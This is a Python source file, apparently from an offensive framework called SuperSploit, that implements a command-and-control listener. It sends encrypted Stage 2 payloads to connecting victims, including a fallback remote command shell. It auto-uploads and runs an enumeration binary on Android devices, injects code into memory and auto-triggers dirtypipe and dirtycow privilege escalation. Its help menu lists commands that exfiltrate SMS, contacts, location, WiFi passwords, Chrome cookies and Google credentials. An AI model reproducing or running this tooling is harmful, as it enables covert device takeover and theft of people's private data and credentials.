import os
import socket
import ssl
import struct
import subprocess
import threading
import time
import random
import base64
import zlib
import shutil
import glob

from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from .database import DatabaseManagment
from .ToStdOut import ToStdout
from .jobs import JobManager

write = ToStdout.write

# Initialize global C2 command history
installation = DatabaseManagment.getInstall()
c2_history = FileHistory(f'{installation}/.data/.history/c2_history')

class Listener:
    active_listener_socket = None
    active_sessions = {}
    session_counter = 1

    @staticmethod
    def send_enc(sock, data):
        import struct, base64
        key = DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        enc = base64.b64encode(bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)]))
        sock.sendall(struct.pack('>I', len(enc)) + enc)

    @staticmethod
    def recv_enc(sock):
        import struct, base64
        key = DatabaseManagment.get().get("XOR_KEY", "SuperSploitKey")
        def _r(n):
            d = bytearray()
            while len(d) < n:
                p = sock.recv(n - len(d))
                if not p: return None
                d.extend(p)
            return bytes(d)
        raw_l = _r(4)
        if not raw_l: return None
        l = struct.unpack('>I', raw_l)[0]
        if l == 0: return b"" # Heartbeat frame
        enc = _r(l)
        if not enc: return None
        dec = base64.b64decode(enc)
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(dec)])

    @classmethod
    def start(cls, database, deploy_stage2=False):
        """
        Native Raw Socket Listener. Acts as the C2 Server.
        Catches incoming connections, auto-deploys Stage 2 fileless payloads, and drops into an interactive shell.
        """
        # Clean up any dangling listener from a previous exploit run
        if cls.active_listener_socket:
            write("[*] Terminating previous background listener to free the port...")
            old_socket = cls.active_listener_socket
            cls.active_listener_socket = None  # Signal the background thread to stop
            
            try:
                # Forcibly break the blocking accept() call immediately
                old_socket.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                old_socket.close()
            except Exception:
                pass
            time.sleep(1.0)  # Wait for the old thread's timeout to trigger and fully release the binding
            
        # Prefer LPORT/LHOST for reverse listeners, aligning with the payload generator defaults
        port = database.get("LPORT", database.get("L_PORT", "5000"))
        host = database.get("LHOST", database.get("L_HOST", "0.0.0.0"))

        def handle_client(raw_client, addr, deploy_stage2_flag, stage2_code, context):
            try:
                # Enable OS-level TCP Keepalives to handle dropped network packets
                raw_client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                try:
                    if hasattr(socket, 'TCP_KEEPIDLE'):
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
                    elif hasattr(socket, 'TCP_KEEPALIVE'):
                        # macOS specific TCP keepalive
                        raw_client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 60)
                except Exception:
                    pass

                # Peek at the first byte to determine if it's a TLS handshake
                first_byte = raw_client.recv(1, socket.MSG_PEEK)
                if first_byte == b'\x16': # TLS Handshake (ClientHello)
                    client = context.wrap_socket(raw_client, server_side=True)
                    write(f"\n\n[+] Secure TLS connection established from {addr[0]}:{addr[1]}")
                else:
                    client = raw_client
                    write(f"\n\n[+] Unencrypted TCP connection established from {addr[0]}:{addr[1]}")


                if deploy_stage2_flag:
                    write("[*] Connection caught! Packaging and encrypting Stage 2 in-memory C2...")
                    
                    try:
                        # Dynamically weaponize the Stage 2 code with active framework variables
                        from .stager_generator import StagerGenerator
                        import tempfile
                        
                        # We use the current session's host/port for the beacon callback
                        # unless explicitly overridden in the database
                        lhost = database.get("LHOST", database.get("L_HOST", "127.0.0.1"))
                        lport = database.get("LPORT", database.get("L_PORT", "5000"))
                        xor_key = database.get("XOR_KEY", "SuperSploitKey")
                        stage2url = database.get("STAGE2URL", database.get("STAGE2_URL", f"http://{lhost}:8000"))

                        # Ensure we have a string representation for the generator
                        stage2code_str = stage2_code.decode('utf-8', errors='ignore') if isinstance(stage2_code, bytes) else stage2_code

                        # Re-process the code through the generator to inject variables
                        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
                            tmp.write(stage2code_str)
                            temp_path = tmp.name
                        
                        generator = StagerGenerator(temp_path)
                        weaponized_code = generator.get_raw_payload(
                            lhost=lhost,
                            lport=lport,
                            xor_key=xor_key,
                            stage2url=stage2url,
                            obfuscate=False
                        )
                        if os.path.exists(temp_path):
                            os.remove(temp_path)
                        
                        # Use the weaponized code for delivery
                        payload_to_send = weaponized_code.encode()

                        # 1. Zlib compress the payload
                        payload_data = zlib.compress(payload_to_send)
                    except Exception as e:
                        write(f"[!] Warning: Failed to dynamically weaponize Stage 2: {e}")
                        # Fallback to original code
                        try:
                            payload_data = zlib.compress(stage2_code)
                        except Exception:
                            payload_data = stage2_code

                    # 2. XOR encrypt the payload to match stager decryption
                    xor_key = database.get("XOR_KEY", "SuperSploitKey")
                    encrypted_payload = bytes([b ^ ord(xor_key[i % len(xor_key)]) for i, b in enumerate(payload_data)])

                    # 3. Base64 encode the final result
                    encoded_stage2 = base64.b64encode(encrypted_payload)
                    
                    # 4. Prepend Framework Magic Bytes for stager validation
                    magic = b"\x53\x53" # 'SS'
                    final_blob = magic + encoded_stage2

                    length_header = struct.pack('>I', len(final_blob))
                    client.sendall(length_header + final_blob)
                    write(f"[*] Stage 2 payload sent over TLS to {addr[0]}:{addr[1]}.")

                # Register the active session
                session_id = cls.session_counter
                cls.session_counter += 1
                cls.active_sessions[session_id] = {
                    "socket": client,
                    "addr": addr
                }
                
                write(f"[+] Background Session {session_id} opened! Type 'sessions -i {session_id}' to interact.\n")
                
                # Fetch the initialization banner
                client.settimeout(5.0)
                try:
                    banner_raw = cls.recv_enc(client)
                    if banner_raw:
                        banner = banner_raw.decode('utf-8', errors='ignore').strip()
                        write(f"[Session {session_id}]: {banner}\n")
                except socket.timeout:
                    pass
                client.settimeout(None)

                # Trigger automated enumeration in the background
                if database.get("AUTO_ENUM", "true").lower() == "true":
                    threading.Thread(target=cls._auto_enumerate, args=(client, addr, session_id, database), daemon=True).start()

            except Exception as e:
                import traceback
                write(f"\n[-] Failed to handle client {addr}: {e}")
                if "SSL" in str(e) or "handshake" in str(e).lower():
                    write(traceback.format_exc())

        def listener_thread():
            try:
                # --- SSL/TLS Certificate Generation ---
                cert_dir = os.path.join(DatabaseManagment.getInstall(), ".data", ".config")
                cert_path = os.path.join(cert_dir, "c2_cert.pem")
                key_path = os.path.join(cert_dir, "c2_key.pem")

                # Auto-generate an ephemeral self-signed cert if it doesn't already exist
                if not os.path.exists(cert_path) or not os.path.exists(key_path):
                    write("[*] Generating ephemeral self-signed SSL/TLS certificate...")
                    subprocess.run([
                        "openssl", "req", "-x509", "-newkey", "rsa:4096", "-keyout", key_path,
                        "-out", cert_path, "-days", "365", "-nodes", "-subj", "/CN=supersploit.c2"
                    ], check=True, capture_output=True)

                context = ssl.SSLContext(ssl.PROTOCOL_TLS) # Use PROTOCOL_TLS for maximum compatibility
                context.options |= ssl.OP_NO_SSLv2
                context.options |= ssl.OP_NO_SSLv3
                # Explicitly allow TLS 1.0+ to support older Android versions if necessary
                context.minimum_version = ssl.TLSVersion.TLSv1
                context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower security level slightly for compatibility
                context.load_cert_chain(certfile=cert_path, keyfile=key_path)

                # Create a raw TCP socket listener
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # DEBUG TIP: SO_REUSEADDR tells the OS kernel to release the port immediately if the 
                # framework crashes. Without this, you get "Address already in use" errors for ~60 seconds.
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Add SO_REUSEPORT for macOS/BSD to forcefully allow binding if the port is held by a stale session
                try:
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                except AttributeError:
                    pass
                
                # Register the active socket so future executions can clean it up
                cls.active_listener_socket = server
                
                # Robust Binding Loop to handle OS-level socket reclamation delays
                bound = False
                nonlocal host
                for _ in range(5):
                    try:
                        server.bind((host, int(port)))
                        bound = True
                        break
                    except OSError as e:
                        # errno 99 is EADDRNOTAVAIL (Cannot assign requested address)
                        if getattr(e, 'errno', None) == 99 or "Cannot assign requested address" in str(e):
                            write(f"\n[!] Warning: Cannot bind to {host}. Interface might be down or invalid. Falling back to 0.0.0.0...")
                            host = "0.0.0.0"
                        elif getattr(e, 'errno', None) == 48 or getattr(e, 'errno', None) == 98 or "Address already in use" in str(e):
                            time.sleep(1)
                        else:
                            raise e
                            
                if not bound:
                    write(f"\n[!] Fatal: Could not bind to {host}:{port}. Address still in use.")
                    cls.active_listener_socket = None
                    return

                server.listen(5)
                server.settimeout(0.5)  # Unblock accept() every 0.5s to check for termination signals
                write(f"\n[*] SSL/TLS background listener active on {host}:{port}. Waiting for connections...")

                # Pre-load Stage 2 code to avoid disk I/O on every connection
                stage2_code = b""
                if deploy_stage2:
                    stage_two_path = database.get("STAGE_TWO", "")
                    if stage_two_path and os.path.exists(stage_two_path):
                        with open(stage_two_path, "rb") as file:
                            stage2_code = file.read()
                    else:
                        write(f"[!] STAGE_TWO not set or missing. Falling back to default Stage 2 shell...")
                        stage2_code = b"def _():\n global client_socket\n _o=__import__('os')\n _s=__import__('subprocess')\n while 1:\n  try:\n   c=client_socket.recv(4096).decode('utf-8',errors='ignore').strip()\n   if not c:continue\n   if c=='exit':break\n   p=_s.run(c,shell=True,capture_output=True,text=True)\n   client_socket.send((p.stdout+p.stderr+'\\n').encode())\n  except:break\n_()"

                def heartbeat_monitor(bound_server):
                    """Background thread to purge dead sessions using a 1-byte ping."""
                    while cls.active_listener_socket is bound_server:
                        # Introduce jitter by making the wait time random between 45 and 75 seconds
                        jitter_seconds = random.randint(45, 75)
                        for _ in range(jitter_seconds):
                            time.sleep(1)
                            if cls.active_listener_socket is not bound_server:
                                return
                        for sid, info in list(cls.active_sessions.items()):
                            # OPSEC: Do not send heartbeats to sessions currently being interacted with.
                            # Large data transfers (upload/download) are vulnerable to race conditions
                            # where the agent consumes the heartbeat as data.
                            if info.get("busy"):
                                continue

                            try:
                                # OPSEC: Send a 0-length frame heartbeat.
                                # This verifies the socket is alive securely without breaking the crypto stream.
                                sock = info["socket"]
                                sock.sendall(struct.pack('>I', 0))
                            except Exception:
                                try:
                                    info["socket"].close()
                                except Exception:
                                    pass
                                if sid in cls.active_sessions:
                                    del cls.active_sessions[sid]

                threading.Thread(target=heartbeat_monitor, args=(server,), daemon=True).start()

                # Infinite accept loop for Multi-Client C2
                while True:
                    # Exit cleanly if we are no longer the active listener
                    if cls.active_listener_socket is not server:
                        break
                        
                    try:
                        raw_client, addr = server.accept()
                        raw_client.settimeout(None)  # Restore blocking mode for the new client connection
                    except socket.timeout:
                        continue
                    except OSError:
                        # Triggered when another exploit run closes this server socket
                        break
                        
                    # Handle the new connection in a separate background thread
                    threading.Thread(
                        target=handle_client,
                        args=(raw_client, addr, deploy_stage2, stage2_code, context),
                        daemon=True
                    ).start()

                # Clean up socket upon thread exit
                server.close()

            except Exception as e:
                # We purposely trigger a Bad file descriptor error when shutting down the old socket, ignore it
                if "Bad file descriptor" not in str(e):
                    write(f"[!] Listener Error: {e}")

        # DEBUG TIP: daemon=True means this thread will automatically be killed if the main 
        # SuperSploit application closes. Without this, the framework would hang indefinitely on exit.
        # Run in a daemon thread so the exploit script can continue running
        def kill_listener():
            if cls.active_listener_socket:
                try:
                    cls.active_listener_socket.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    cls.active_listener_socket.close()
                except Exception:
                    pass
                cls.active_listener_socket = None

        thread = threading.Thread(target=listener_thread, daemon=True)
        thread.start()
        
        JobManager.register(
            name=f"Native TLS C2 Listener ({host}:{port})",
            terminate_func=kill_listener,
            thread_obj=thread
        )

    @classmethod
    def _auto_enumerate(cls, client, addr, session_id, database):
        """Automatically runs enumeration tools on a new session and updates the target profile."""
        try:
            # Short delay to allow session to settle
            time.sleep(3)
            
            # 1. Identify if it's Android
            cls.send_enc(client, b"getprop ro.product.model")
            model_raw = cls.recv_enc(client)
            if not model_raw or model_raw.strip() == b"":
                return # Not Android or unresponsive
            
            model = model_raw.decode('utf-8', errors='ignore').strip()
            write(f"[*] Session {session_id}: Detected Android device ({model}). Starting auto-enum...\n")
            
            # 2. Identify Architecture
            cls.send_enc(client, b"uname -m")
            arch_raw = cls.recv_enc(client)
            arch = arch_raw.decode('utf-8', errors='ignore').strip() if arch_raw else "aarch64"
            
            # 3. Compile or find enumeration tool
            install = DatabaseManagment.getInstall()
            tool_source = os.path.join(install, "source", "tools", "android-enum3.c")
            
            comp_arch = "android_arm64" if "64" in arch else "android_v7"
            out_file = os.path.join(install, ".data", ".cache", f"android-enum3_{comp_arch}")
            os.makedirs(os.path.dirname(out_file), exist_ok=True)
            
            if not os.path.exists(out_file):
                # Attempt to compile
                write(f"[*] Session {session_id}: Compiling enumeration tool for {comp_arch}...")
                compiler = "gcc" # Fallback
                found_compiler = False
                buildozer_root = os.path.expanduser("~/.buildozer")
                if os.path.exists(buildozer_root):
                    pattern = ""
                    if comp_arch == "android_arm64":
                        pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android*-clang")
                    else:
                        pattern = os.path.join(buildozer_root, "android/platform/android-ndk-*/toolchains/llvm/prebuilt/*/bin/armv7a-linux-androideabi*-clang")
                    
                    matches = glob.glob(pattern)
                    if matches:
                        compiler = sorted(matches, reverse=True)[0]
                        found_compiler = True
                
                if not found_compiler:
                    sys_compiler = "aarch64-linux-gnu-gcc" if comp_arch == "android_arm64" else "arm-linux-gnueabi-gcc"
                    if shutil.which(sys_compiler):
                        compiler = sys_compiler
                        found_compiler = True
                
                if found_compiler:
                    proc = subprocess.run([compiler, tool_source, "-o", out_file, "-pthread", "-O2"], capture_output=True)
                    if proc.returncode != 0:
                        write(f"[-] Session {session_id}: Compilation failed.\n")
                        return
                else:
                    write(f"[-] Session {session_id}: No cross-compiler found. Skipping C-based enum.\n")
                    return

            # 4. Upload and Execute
            remote_path = f"/data/local/tmp/.ss_enum_{random.randint(1000, 9999)}"
            with open(out_file, 'rb') as f:
                file_data = f.read()
            
            cls.send_enc(client, f"upload {remote_path}")
            resp = cls.recv_enc(client)
            if resp and b"READY" in resp:
                cls.send_enc(client, file_data)
                cls.recv_enc(client) # Skip upload success message
                
                write(f"[*] Session {session_id}: Running enumeration suite...")
                cls.send_enc(client, f"chmod +x {remote_path} && {remote_path} && rm {remote_path}")
                report_raw = cls.recv_enc(client)
                if report_raw:
                    report = report_raw.decode('utf-8', errors='ignore')
                    
                    # 5. Process Report and Update Profile
                    ip = addr[0]
                    profile = DatabaseManagment.importFromTargets(ip)
                    if not profile:
                        profile = {"name": model or ip, "ip": ip, "research": []}
                    
                    key_points = []
                    for line in report.split('\n'):
                        if "[!]" in line or "CRITICAL" in line or "INFO LEAK" in line:
                            # Strip ANSI codes
                            clean_line = line.replace("\x1b[31m", "").replace("\x1b[32m", "").replace("\x1b[33m", "").replace("\x1b[34m", "").replace("\x1b[35m", "").replace("\x1b[36m", "").replace("\x1b[1m", "").replace("\x1b[0m", "").strip()
                            key_points.append(clean_line)
                    
                    if key_points:
                        for point in key_points:
                            if point not in profile.get("research", []):
                                profile.setdefault("research", []).append(f"Auto-Enum: {point}")
                        DatabaseManagment.addProfile(profile)
                        write(f"[+] Session {session_id}: Enumeration complete. {len(key_points)} key points added to profile '{profile['name']}'.\n")
                    else:
                        write(f"[+] Session {session_id}: Enumeration complete. No critical vulnerabilities found.\n")
        except Exception as e:
            write(f"[-] Session {session_id} auto-enumeration error: {e}\n")

    @classmethod
    def interact(cls, session_id):
        session = cls.active_sessions.get(int(session_id))
        if not session:
            write(f"[-] Session {session_id} not found or inactive.")
            return

        client = session["socket"]
        addr = session["addr"]
        write(f"\n[*] Interacting with Session {session_id} ({addr[0]}:{addr[1]})")
        write(f"[*] Type 'background' or 'bg' to return to SuperSploit.\n")

        # Mark session as busy to prevent heartbeat race conditions
        cls.active_sessions[int(session_id)]["busy"] = True

        # ==========================================
        # C2 COMMAND REGISTRY
        # ==========================================
        registry = {
            "exit": cls._cmd_exit,
            "quit": cls._cmd_exit,
            "background": cls._cmd_background,
            "bg": cls._cmd_background,
            "help": cls._cmd_help,
            "?": cls._cmd_help,
            "search": cls._cmd_search,
            "load": cls._cmd_load,
            "upload": cls._cmd_upload,
            "download": cls._cmd_download,
            "clear": cls._cmd_clear
        }

        # Initialize the interactive prompt session with history
        prompt_session = PromptSession(
            history=c2_history,
            auto_suggest=AutoSuggestFromHistory(),
            enable_history_search=True
        )

        try:
            while True:
                try:
                    cmd = prompt_session.prompt(f"Session {session_id}> ")
                    
                    if not cmd.strip():
                        continue

                    # Apply Aliases (consistent with main framework)
                    import shlex
                    try:
                        dataList = shlex.split(cmd.strip())
                        Aliases = DatabaseManagment._UpdateAliases()
                        for i, token in enumerate(dataList):
                            if token in Aliases:
                                dataList[i] = Aliases[token]
                        cmd = " ".join(dataList)
                    except ValueError:
                        pass

                    # Handle command chaining (&&)
                    if "&&" in cmd:
                        chained_cmds = [c.strip() for c in cmd.split("&&") if c.strip()]
                    else:
                        chained_cmds = [cmd.strip()]

                    for current_cmd in chained_cmds:
                        # Handle Local Output Redirection (>)
                        redirection_file = None
                        if " > " in current_cmd or current_cmd.endswith(">") or ">" in current_cmd:
                            # Only handle if not part of a complex remote shell command
                            # We use a simple split for now
                            if ">" in current_cmd:
                                parts = current_cmd.split(">", 1)
                                current_cmd = parts[0].strip()
                                redirection_file = parts[1].strip()

                        # Handle Local Piping (|)
                        is_pipe = "|" in current_cmd
                        
                        base_cmd = current_cmd.split(" ", 1)[0].lower()
                        
                        # Capture output if redirection or pipe is requested
                        if redirection_file or is_pipe:
                            # Redirect stdout temporarily
                            import sys, io
                            old_stdout = sys.stdout
                            sys.stdout = io.StringIO()
                        
                        # Route to local C2 handler if it exists, otherwise fall through to remote execution
                        if base_cmd in registry:
                            status = registry[base_cmd](client, session_id, current_cmd)
                        else:
                            status = cls._cmd_remote(client, session_id, current_cmd)
                        
                        if redirection_file:
                            captured_output = sys.stdout.getvalue()
                            sys.stdout = old_stdout
                            try:
                                with open(redirection_file, "a") as f:
                                    f.write(captured_output)
                                write(f"[*] Output redirected to {redirection_file}\n")
                            except Exception as e:
                                write(f"[-] Redirection Error: {e}\n")
                        
                        if is_pipe:
                            captured_output = sys.stdout.getvalue()
                            sys.stdout = old_stdout
                            try:
                                # We use a subshell to process the pipe locally
                                # Note: The first command's output is passed as stdin to the rest of the pipe
                                pipe_parts = current_cmd.split("|", 1)
                                rest_of_pipe = pipe_parts[1].strip()
                                
                                # Execute the rest of the pipe using the captured output as input
                                subprocess.run(rest_of_pipe, shell=True, input=captured_output, text=True)
                            except Exception as e:
                                write(f"[-] Piping Error: {e}\n")

                        if status == "break":
                            break
                    
                    # If any command in the chain caused a break, exit the loop
                    if status == "break":
                        break
                        
                except Exception as e:
                    write(f"\n[-] Session {session_id} connection error: {e}")
                    client.close()
                    if int(session_id) in cls.active_sessions:
                        del cls.active_sessions[int(session_id)]
                    break
        finally:
            # Clear busy flag when exiting interaction
            if int(session_id) in cls.active_sessions:
                cls.active_sessions[int(session_id)]["busy"] = False

    # ==========================================
    # C2 COMMAND HANDLERS
    # ==========================================

    @classmethod
    def _cmd_exit(cls, client, session_id, cmd):
        cls.send_enc(client, b"exit")
        client.close()
        if int(session_id) in cls.active_sessions:
            del cls.active_sessions[int(session_id)]
        write(f"[*] Session {session_id} closed.\n")
        return "break"

    @classmethod
    def _cmd_background(cls, client, session_id, cmd):
        write(f"[*] Backgrounding Session {session_id}...\n")
        return "break"

    @classmethod
    def _cmd_clear(cls, client, session_id, cmd):
        write("\033[H\033[J")
        return "continue"

    @classmethod
    def _cmd_help(cls, client, session_id, cmd):
        parts = cmd.split(' ', 1)
        if len(parts) == 1 or cmd == '?':
            write("""
======================================================================
               📡 C2 SESSION INTERACTION MENU
======================================================================
[ SESSION CONTROLS ]
  background, bg      Background the current session and return to main
  exit, quit          Terminate the C2 agent and close the connection
  clear               Clear the terminal screen
  help, ?             Show this help menu

[ ENCRYPTED FILE OPERATIONS ]
  upload <L> <R>      Upload a local file to the remote target
  download <R> <L>    Download a remote file to your local host
  cat <file>          Read and print remote file contents
  rm <file>           Delete a file on the target

[ FILELESS PAYLOAD INJECTION ]
  search <query>      Search framework for loadable Stage 2 payloads
  load <path>         Silently inject a Python payload into target RAM

[ STEALTH NATIVE COMMANDS ]
  cd <dir>            Change current working directory
  pwd                 Print current working directory
  ls [dir]            List files in the current or specified directory
  whoami              Get current user context via environment vars
  hostname            Get target machine hostname via socket module
  id                  Get UID and GID (Unix/Linux only)
  ps                  List running processes (reads /proc on Linux)

[ ANDROID EXFILTRATION & LPE ]
  dump_sms            Exfiltrate all SMS messages from the inbox
  dump_calls          Exfiltrate call logs (number, type, duration)
  dump_contacts       Exfiltrate all contacts and phone numbers
  dump_calendar       Exfiltrate calendar events
  get_accounts        List all accounts configured on the device
  get_location        Extract last known GPS coordinates
  list_apps           List all installed applications with paths
  dump_wifi           Extract all stored WiFi passwords (Root only)
  dump_chrome         Harvest Chrome cookies and logins (Root only)
  dump_google_passwords Targeted GMS/System credential dump (Root only)
  find_cookies        Search for all cookie databases on device (Root only)
  find_passwords       Search for all password/credential stores (Root only)
  lpe_enum            Automated LPE audit with exploit suggestions
  auto_root           Attempt silent privilege escalation (Rootkit only)

[ PYTHON MEMORY EXECUTION ]
  exec(<code>)        Evaluate Python code directly in target's RAM
  <func>()            Call a previously loaded Python function

[ OS SHELL EXECUTION ]
  <command>           Any command not listed above is safely executed
                      via the OS without spawning a noisy sub-shell.
======================================================================
""")
            return "continue"
            
        topic = parts[1]
        help_path = os.path.join(DatabaseManagment.getInstall(), ".data", ".help", topic)
        if os.path.exists(help_path):
            from .help import Help
            Help.display(topic)
            return "continue"
            
        # Fallback to remote execution if local help file doesn't exist
        return cls._cmd_remote(client, session_id, cmd)

    @classmethod
    def _cmd_search(cls, client, session_id, cmd):
        from .search import Search
        keyword = cmd[7:].strip() if len(cmd) > 6 else ""
        Search.search(f"search loadable {keyword}".strip())
        return "continue"

    @classmethod
    def _cmd_upload(cls, client, session_id, cmd):
        parts = cmd.split(" ", 2)
        if len(parts) < 3:
            write("[-] Usage: upload <local_file> <remote_path>\n")
            return "continue"
        local_file, remote_path = parts[1], parts[2]
        if not os.path.exists(local_file):
            write(f"[-] Local file {local_file} not found.\n")
            return "continue"
        with open(local_file, 'rb') as f:
            file_data = f.read()
        cls.send_enc(client, f"upload {remote_path}")
        if b"READY" in cls.recv_enc(client):
            cls.send_enc(client, file_data)
            write(cls.recv_enc(client).decode('utf-8', errors='ignore'))
        return "continue"

    @classmethod
    def _cmd_download(cls, client, session_id, cmd):
        parts = cmd.split(" ", 2)
        if len(parts) < 3:
            write("[-] Usage: download <remote_file> <local_path>\n")
            return "continue"
        remote_file, local_path = parts[1], parts[2]
        cls.send_enc(client, f"download {remote_file}")
        file_data = cls.recv_enc(client)
        if file_data.startswith(b"ERROR:"):
            write(file_data.decode('utf-8', errors='ignore'))
        else:
            with open(local_path, 'wb') as f: f.write(file_data)
            write(f"[+] Successfully downloaded to {local_path}\n")
        return "continue"

    @classmethod
    def _cmd_load(cls, client, session_id, cmd):
        parts = cmd.split(" ", 1)
        if len(parts) < 2:
            write("[-] Usage: load <path>\n")
            return "continue"
            
        exploit_path = parts[1]
        try:
            from .session_loader import SessionLoader
            loader_payload, func_name = SessionLoader.load(exploit_path)
            
            # OPSEC Fallback: Raw Python script detection
            if not loader_payload and exploit_path.endswith('.py') and os.path.exists(exploit_path):
                with open(exploit_path, 'r') as f:
                    loader_payload = f.read()
                    if "#!#!#!" in loader_payload:
                        raw_data = loader_payload.split("#!#!#!")
                        loader_payload = raw_data[0] + raw_data[2] if len(raw_data) >= 3 else raw_data[0]
                func_name = "function"

            if loader_payload:
                cls.send_enc(client, b"load")
                client.settimeout(3.0)
                try:
                    response = cls.recv_enc(client)
                    if response and b"READY" in response:
                        cls.send_enc(client, loader_payload)
                        write(f"[*] Payload '{os.path.basename(exploit_path)}' silently staged in memory.\n")
                        if func_name == "function":
                            write(f"[*] You can now trigger it at your discretion by calling its function.\n")
                        else:
                            write(f"[*] You can now trigger the ELF binary by typing:\n    {func_name}()\n")
                    else:
                        write(f"[-] Agent refused staged load.\n")
                except socket.timeout:
                    write("[-] Agent timed out waiting for load handshake.\n")
                finally:
                    client.settimeout(None)
            else:
                write("[-] Module did not return a valid loader payload.\n")
        except Exception as e:
            write(f"[-] Failed to load payload: {e}\n")
        return "continue"

    @classmethod
    def _cmd_remote(cls, client, session_id, cmd):
        """Handles commands not natively recognized by the C2 client by passing them to the remote agent."""
        cls.send_enc(client, cmd)
        data = cls.recv_enc(client)
        if data is None:
            write(f"\n[-] Session {session_id} died unexpectedly.\n")
            client.close()
            if int(session_id) in cls.active_sessions:
                del cls.active_sessions[int(session_id)]
            return "break"
            
        try:
            decoded_data = data.decode('utf-8', errors='ignore')
        except:
            decoded_data = ""
            
        if decoded_data.startswith("GET_EXPLOIT "):
            exploit_path = decoded_data.split(" ", 1)[1].strip()
            write(f"[*] Agent requested in-memory exploit: {exploit_path}\n")
            
            # Send the payload to the agent via the load command
            cls._cmd_load(client, session_id, f"load {exploit_path}")
            
            # After loading, trigger the exploit
            if "dirtypipe" in exploit_path:
                write("[*] Automatically triggering dirtypipe()...\n")
                cls.send_enc(client, "dirtypipe()")
                res = cls.recv_enc(client)
                if res:
                    print(res.decode('utf-8', errors='ignore'), end="")
            elif "dirtycow" in exploit_path:
                write("[*] Automatically triggering check_dirtycow()...\n")
                cls.send_enc(client, "check_dirtycow()")
                res = cls.recv_enc(client)
                if res:
                    print(res.decode('utf-8', errors='ignore'), end="")
            return "continue"

        print(decoded_data, end="")
        return "continue"